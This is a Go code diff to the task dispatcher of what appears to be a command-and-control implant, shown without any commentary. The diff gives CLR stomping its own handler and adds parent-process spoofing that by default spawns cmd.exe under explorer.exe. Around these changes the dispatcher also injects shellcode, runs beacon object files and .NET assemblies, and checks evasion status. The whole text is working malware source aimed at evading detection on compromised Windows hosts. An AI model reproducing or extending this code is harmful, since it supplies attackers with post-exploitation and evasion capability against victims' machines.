@@ -203,13 +203,16 @@ func dispatchTask(t transport, task taskWire) {
 		t.sendResult(task.ID, fmt.Sprintf("injecting %d bytes", len(sc)), "")
 		go func() { injectShellcode(sc) }()
 
-	case "BOF", "CLR_STOMP":
+	case "BOF":
 		output, err := dispatchBOF(task)
 		errStr := ""
 		if err != nil {
 			errStr = err.Error()
 		}
 		t.sendResult(task.ID, output, errStr)
+
+	case "CLR_STOMP":
+		t.sendResult(task.ID, clrStomp(), "")
 
 	case "DOTNET_EXEC":
 		// Args JSON: {"asm":"<base64>","args":"<string>","type":"<opt>","method":"<opt>"}
@@ -434,7 +437,17 @@ func dispatchTask(t transport, task taskWire) {
 		t.sendResult(task.ID, fmt.Sprintf("%d", os.Getpid()), "")
 
 	case "PPID":
-		t.sendResult(task.ID, fmt.Sprintf("%d", os.Getppid()), "")
+		var pa struct {
+			Cmd    string `json:"cmd"`
+			Parent string `json:"parent"`
+		}
+		if err := json.Unmarshal([]byte(task.Args), &pa); err != nil || pa.Cmd == "" {
+			pa.Cmd = "cmd.exe"
+		}
+		if pa.Parent == "" {
+			pa.Parent = "explorer.exe"
+		}
+		t.sendResult(task.ID, spawnWithPPID(pa.Cmd, pa.Parent), "")
 
 	case "EVASION_STATUS":
 		spoofGadget := getSpoofGadgetAddr()
